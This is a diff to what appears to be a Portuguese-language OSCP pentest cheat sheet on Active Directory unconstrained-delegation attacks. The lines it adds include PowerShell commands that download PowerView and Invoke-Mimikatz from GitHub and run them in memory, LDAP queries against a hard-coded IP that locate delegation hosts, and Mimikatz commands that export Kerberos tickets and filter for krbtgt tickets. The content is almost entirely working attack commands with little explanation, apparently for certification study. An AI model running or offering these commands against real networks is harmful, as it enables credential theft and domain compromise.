@@ -1249,7 +1249,10 @@ import-module .\Microsoft.ActiveDirectory.Management.dll
 curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerView.ps1
 import-module .\PowerView.ps1
 ```
-##### UNCONSTRAINED DELEGATION - FIND SPN
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
+```
+##### UNCONSTRAINED DELEGATION - FIND COMPUTERS WITH UNCONSTRAINED DELEGATION (POWERVIEW)
 PROCURE POR CONTAS DE COMPUTADOR COM UNCONSTRAINED DELEGATION
 ```
 Get-NetComputer -UnConstrained
@@ -1266,8 +1269,27 @@ $LDAPSEARCH.FindAll()
 ```
 ```
 ldapsearch -LLL -x -h 54.189.219.43   -D "vegeta@tech.local" -W -b "DC=tech,DC=local" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
+ldapsearch -LLL -x -h 54.189.219.43   -D "regularuser@tech.local" -W -b "DC=tech,DC=local" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep sAMAccountName
 ```
-
+##### UNCONSTRAINED DELEGATION - DEPOIS DE COMPROMETER O SERVIDOR COM UD, EXPORTAS OS TICKETS KERBEROS.
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
+Import-Module .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
+Invoke-Mimikatz
+```
+MIMIKATZ - LISTAR OS TICKETS / EXPORTAR OS TICKETS
+```
+sekurlsa::tickets
+sekurlsa::tickets /export
+```
+FILTRAR OS TICKETS
+```
+dir *.kirbi | findstr /I krbtgt | findstr /V "$@"
+```
 
 
 
